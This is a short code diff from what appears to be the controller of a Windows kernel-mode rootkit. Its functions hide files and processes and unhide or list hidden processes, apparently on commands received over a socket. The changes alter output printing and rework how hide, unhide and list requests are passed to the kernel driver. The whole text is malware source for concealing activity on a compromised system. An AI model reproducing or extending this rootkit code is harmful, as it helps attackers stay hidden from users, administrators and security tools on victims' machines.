@@ -508,10 +508,10 @@ BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCK
 		for (int bufferi = 0; bufferi < RootkInstructions.Size; bufferi += sizeof(WCHAR)) {
 			RtlCopyMemory(&CurrentCharacter, (PVOID)((ULONG64)HiddenFiles + bufferi), sizeof(WCHAR));
 			if (CurrentCharacter == L'|') {
-				wprintf(L"\n");
+				printf("\n");
 			}
 			else if (CurrentCharacter == L'\0') {
-				wprintf(L"(+nullterm)");
+				printf("(+nullterm)");
 			}
 			else {
 				wprintf(L"%c", CurrentCharacter);
@@ -556,17 +556,21 @@ BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCK
 	switch (RequestStatus) {
 	case HIDE_PROCESS:
 		RootkInstructions.MainPID = (ULONG64)ProcessId;
-		RootkInstructions.Size = 0;
+		RootkInstructions.Reserved = (PVOID)HideProcess;
 		break;
 	case UNHIDE_PROCESS:
 		if (RemoveIndex != -1) {
 			RootkInstructions.SemiPID = (ULONG64)RemoveIndex;
+			RootkInstructions.MainPID = REMOVE_BY_INDEX_PID;
 		}
-		RootkInstructions.MainPID = (ULONG64)ProcessId;
-		RootkInstructions.Size = 1;
+		else {
+			RootkInstructions.SemiPID = 0;
+			RootkInstructions.MainPID = (ULONG64)ProcessId;
+		}
+		RootkInstructions.Reserved = (PVOID)UnhideProcess;
 		break;
 	default:
-		RootkInstructions.Size = 2;
+		RootkInstructions.Reserved = (PVOID)ListHiddenProcesses;
 		break;
 	}
 
